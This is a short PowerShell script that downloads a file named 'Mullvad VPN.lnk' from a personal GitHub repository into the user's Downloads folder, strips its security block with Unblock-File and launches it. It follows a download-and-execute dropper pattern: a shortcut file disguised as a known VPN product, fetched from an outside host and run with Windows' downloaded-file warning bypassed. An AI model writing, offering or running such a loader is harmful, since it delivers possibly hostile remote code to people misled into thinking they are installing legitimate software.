$url = "https://raw.githubusercontent.com/Migss2x/testzzz/main/Mullvad%20VPN.lnk"
$output = "$env:USERPROFILE\Downloads\Mullvad VPN.lnk"

Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

# Unblock the file if blocked
Unblock-File -Path $output

# Wait a moment to ensure file is ready
Start-Sleep -Seconds 2

# Try starting the file
Start-Process $output
